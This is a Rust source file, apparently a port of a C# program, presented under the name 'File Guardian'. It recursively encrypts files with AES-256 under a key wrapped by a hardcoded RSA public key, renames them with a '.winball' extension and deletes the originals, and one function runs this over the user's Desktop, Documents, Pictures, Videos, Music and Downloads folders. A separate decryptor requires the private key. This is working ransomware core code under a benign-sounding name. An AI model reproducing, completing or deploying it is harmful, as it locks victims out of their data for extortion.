mod raes;

use raes::Raes;
use std::fs::{self, File};
use std::io::{Read, Write, Seek};
use std::path::{Path};
use walkdir::WalkDir;
use aes::cipher::{block_padding::Pkcs7, BlockDecryptMut, BlockEncryptMut, KeyIvInit, Block};
use pbkdf2::pbkdf2;
use hmac::Hmac;
use sha2::Sha512;
use dirs;

type Aes256CbcEnc = cbc::Encryptor<aes::Aes256>;
type Aes256CbcDec = cbc::Decryptor<aes::Aes256>;

const KEYSIZE_BITS: usize = 2048;
const CHUNK_SIZE: usize = 1000000;

/// Recursively encrypts files in the given directory using the provided RSA public key XML.
pub fn encrypt(dir: &str, public_key_xml: &str) -> Result<(), Box<dyn std::error::Error>> {
    let path = Path::new(dir);
    if !path.exists() {
        return Err("Directory does not exist".into());
    }

    // Generate random AES key material (67 bytes as per C#)
    let aeskey_material = Raes::generaterandomkey(67);

    // Derive the actual 256-bit AES key from the material using PBKDF2-SHA512
    let mut aes_key = [0u8; 32];
    pbkdf2::<Hmac<Sha512>>(
        &aeskey_material,
        "youcanjoinsaltinfutureversionsmsmsms".as_bytes(),
        125,
        &mut aes_key,
    )?;

    // RSA-encrypt the key material (256 bytes for 2048-bit RSA)
    let encrypted_aeskey_material = Raes::rsaencrypt(&aeskey_material, public_key_xml, KEYSIZE_BITS)?;

    for entry in WalkDir::new(path).into_iter().filter_map(|e| e.ok()) {
        if entry.file_type().is_file() {
            let file_path = entry.path();
            let extension = file_path.extension().and_then(|s| s.to_str()).unwrap_or("");
            if extension == "winball" {
                continue;
            }

            match encrypt_file(file_path, &encrypted_aeskey_material, &aes_key) {
                Ok(_) => {
                    let _ = fs::remove_file(file_path);
                }
                Err(e) => eprintln!("Error encrypting {:?}: {}", file_path, e),
            }
        }
    }

    Ok(())
}

fn encrypt_file(file_path: &Path, encrypted_aeskey: &[u8], aes_key: &[u8; 32]) -> Result<(), Box<dyn std::error::Error>> {
    // Generate IV for each file using PBKDF2-SHA512 on a random seed
    let iv_seed = Raes::generaterandomkey(67);
    let reversed_iv_seed = Raes::reversebarray(&iv_seed);
    let salt_str = Raes::reversestring("youcanjoinsaltinfutureversivonsmsmsms");

    let mut iv = [0u8; 16];
    pbkdf2::<Hmac<Sha512>>(
        &reversed_iv_seed,
        salt_str.as_bytes(),
        143,
        &mut iv,
    )?;

    let mut input_file = File::open(file_path)?;
    let output_file_path = file_path.with_extension(format!("{}.winball", file_path.extension().and_then(|s| s.to_str()).unwrap_or("")));
    let mut output_file = File::create(&output_file_path)?;

    // Write RSA-encrypted key material and IV to the header
    output_file.write_all(encrypted_aeskey)?;
    output_file.write_all(&iv)?;

    let mut encryptor = Aes256CbcEnc::new((aes_key).into(), (&iv).into());

    let mut input_buffer = vec![0u8; CHUNK_SIZE + 16];

    let file_size = input_file.metadata()?.len();
    let mut pos = 0;

    while pos < file_size {
        let remaining = file_size - pos;
        let to_read = if remaining > CHUNK_SIZE as u64 { CHUNK_SIZE } else { remaining as usize };
        input_file.read_exact(&mut input_buffer[..to_read])?;
        pos += to_read as u64;

        if pos < file_size {
            for chunk in input_buffer[..to_read].chunks_exact_mut(16) {
                let block = Block::<aes::Aes256>::from_mut_slice(chunk);
                encryptor.encrypt_block_mut(block);
            }
            output_file.write_all(&input_buffer[..to_read])?;
        } else {
            let out = encryptor.encrypt_padded_mut::<Pkcs7>(&mut input_buffer, to_read)
                .map_err(|_| "Encryption padding error")?;
            output_file.write_all(&out)?;
            break;
        }
    }

    Ok(())
}

/// Recursively decrypts .winball files in the given directory using the provided RSA private key XML.
pub fn decrypt(dir: &str, private_key_xml: &str) -> Result<(), Box<dyn std::error::Error>> {
    let path = Path::new(dir);
    if !path.exists() {
        return Err("Directory does not exist".into());
    }

    for entry in WalkDir::new(path).into_iter().filter_map(|e| e.ok()) {
        if entry.file_type().is_file() {
            let file_path = entry.path();
            if file_path.extension().and_then(|s| s.to_str()) != Some("winball") {
                continue;
            }

            match decrypt_file(file_path, private_key_xml) {
                Ok(_) => {
                    let _ = fs::remove_file(file_path);
                }
                Err(e) => eprintln!("Error decrypting {:?}: {}", file_path, e),
            }
        }
    }

    Ok(())
}

fn decrypt_file(file_path: &Path, private_key_xml: &str) -> Result<(), Box<dyn std::error::Error>> {
    let mut input_file = File::open(file_path)?;

    // Read RSA-encrypted key material from header
    let mut encrypted_aeskey_material = [0u8; 256];
    input_file.read_exact(&mut encrypted_aeskey_material)?;

    // Read IV from header
    let mut iv = [0u8; 16];
    input_file.read_exact(&mut iv)?;

    // RSA-decrypt the key material
    let aeskey_material = Raes::rsadecrypt(&encrypted_aeskey_material, private_key_xml, KEYSIZE_BITS)?;

    // Re-derive the actual AES key
    let mut aes_key = [0u8; 32];
    pbkdf2::<Hmac<Sha512>>(
        &aeskey_material,
        "youcanjoinsaltinfutureversionsmsmsms".as_bytes(),
        125,
        &mut aes_key,
    )?;

    // Prepare output file path (strip .winball)
    let output_file_path = file_path.with_extension("");
    let mut output_file = File::create(&output_file_path)?;

    let mut decryptor = Aes256CbcDec::new((&aes_key).into(), (&iv).into());

    let mut input_buffer = vec![0u8; CHUNK_SIZE + 16];
    let file_size = input_file.metadata()?.len();
    let mut current_pos = input_file.stream_position()?;

    while current_pos < file_size {
        let remaining = file_size - current_pos;
        let to_read = if remaining > CHUNK_SIZE as u64 { CHUNK_SIZE } else { remaining as usize };
        input_file.read_exact(&mut input_buffer[..to_read])?;
        current_pos += to_read as u64;

        if current_pos < file_size {
            for chunk in input_buffer[..to_read].chunks_exact_mut(16) {
                let block = Block::<aes::Aes256>::from_mut_slice(chunk);
                decryptor.decrypt_block_mut(block);
            }
            output_file.write_all(&input_buffer[..to_read])?;
        } else {
            let out = decryptor.decrypt_padded_mut::<Pkcs7>(&mut input_buffer[..to_read])
                .map_err(|_| "Decryption error (possibly wrong key or corrupted file)")?;
            output_file.write_all(&out)?;
            break;
        }
    }

    Ok(())
}

/// Automatically runs encryption on standard user folders.
pub fn run_guardian(public_key: &str) -> Result<(), Box<dyn std::error::Error>> {
    let folders = vec![
        dirs::desktop_dir(),
        dirs::document_dir(),
        dirs::picture_dir(),
        dirs::video_dir(),
        dirs::audio_dir(),
        dirs::download_dir(),
    ];

    for folder in folders.into_iter().flatten() {
        if let Some(s) = folder.to_str() {
            let _ = encrypt(s, public_key);
        }
    }

    Ok(())
}

/// Automatically runs decryption on standard user folders.
pub fn run_decryptor(private_key: &str) -> Result<(), Box<dyn std::error::Error>> {
    let folders = vec![
        dirs::desktop_dir(),
        dirs::document_dir(),
        dirs::picture_dir(),
        dirs::video_dir(),
        dirs::audio_dir(),
        dirs::download_dir(),
    ];

    for folder in folders.into_iter().flatten() {
        if let Some(s) = folder.to_str() {
            let _ = decrypt(s, private_key);
        }
    }

    Ok(())
}

fn main() {
    println!("File Guardian Ported to Rust");
    let _public_key = "<RSAKeyValue><Modulus>sFCjXDLTTsLJGHRCK5uTawwBCWUWyUDK/CsxBn5mQKlOZd0ibBvZ3lpoQpuyww6cX096eKPsW8vOCUNRfwxv9mfThUJ8Yk+l0uLXvC8kRnNYOmFZCfwgvTEdIZtYIT35nbRyAlGFGL49zTYTmh/NEJcZasSI1XfHZt+G2TW62u2w4ZTufRRosVr5dkWM8CFRVLV+KtoXqA08yu2MSL+UUXDnT8WOYNH0unhoKb4xCWdbT1riP/5LPFicXQi6lQyhSAFXtpfeIrkvvphwoRJKs955ZI4KvUOtwbE361mKJvIB6FuBcCmwScoDhgQkG+4q4MJsZ3zyp0+DuriDyMcvBQ==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write;
    use tempfile::tempdir;
    use base64::{engine::general_purpose, Engine as _};
    use rsa::traits::{PublicKeyParts, PrivateKeyParts};

    #[test]
    fn test_round_trip() {
        let dir = tempdir().unwrap();
        let file_path = dir.path().join("test.txt");
        let mut file = File::create(&file_path).unwrap();
        let content = b"Hello, World! This is a test content for encryption and decryption round-trip.";
        file.write_all(content).unwrap();
        drop(file);

        // Generate RSA Key pair for testing
        let mut rng = rsa::rand_core::OsRng;
        let priv_key = rsa::RsaPrivateKey::new(&mut rng, 2048).expect("failed to generate a key");

        // Convert to XML-like format manually for testing parser
        let n_b64 = general_purpose::STANDARD.encode(priv_key.n().to_bytes_be());
        let e_b64 = general_purpose::STANDARD.encode(priv_key.e().to_bytes_be());
        let p_b64 = general_purpose::STANDARD.encode(priv_key.primes()[0].to_bytes_be());
        let q_b64 = general_purpose::STANDARD.encode(priv_key.primes()[1].to_bytes_be());
        let d_b64 = general_purpose::STANDARD.encode(priv_key.d().to_bytes_be());

        // C# RSA format components
        let p = &priv_key.primes()[0];
        let q = &priv_key.primes()[1];
        let d = priv_key.d();
        let n = priv_key.n();

        let dp = d % (p - rsa::BigUint::from(1u32));
        let dq = d % (q - rsa::BigUint::from(1u32));
        let iq = q.modpow(&(p - rsa::BigUint::from(2u32)), p); // Simple inverse

        let dp_b64 = general_purpose::STANDARD.encode(dp.to_bytes_be());
        let dq_b64 = general_purpose::STANDARD.encode(dq.to_bytes_be());
        let iq_b64 = general_purpose::STANDARD.encode(iq.to_bytes_be());

        let pub_xml = format!("<RSAKeyValue><Modulus>{}</Modulus><Exponent>{}</Exponent></RSAKeyValue>", n_b64, e_b64);
        let priv_xml = format!("<RSAKeyValue><Modulus>{}</Modulus><Exponent>{}</Exponent><P>{}</P><Q>{}</Q><DP>{}</DP><DQ>{}</DQ><InverseQ>{}</InverseQ><D>{}</D></RSAKeyValue>",
            n_b64, e_b64, p_b64, q_b64, dp_b64, dq_b64, iq_b64, d_b64);

        encrypt(dir.path().to_str().unwrap(), &pub_xml).unwrap();
        assert!(dir.path().join("test.txt.winball").exists());
        assert!(!file_path.exists());

        decrypt(dir.path().to_str().unwrap(), &priv_xml).unwrap();
        assert!(!dir.path().join("test.txt.winball").exists());
        assert!(file_path.exists());

        let mut decrypted_content = Vec::new();
        let mut file = File::open(&file_path).unwrap();
        file.read_to_end(&mut decrypted_content).unwrap();

        assert_eq!(content.to_vec(), decrypted_content);
    }

    #[test]
    fn test_getrandomstring() {
        let s = Raes::getrandomstring(10);
        assert_eq!(s.len(), 11);
        for c in s.chars() {
            assert!(c.is_ascii_lowercase());
        }
    }
}
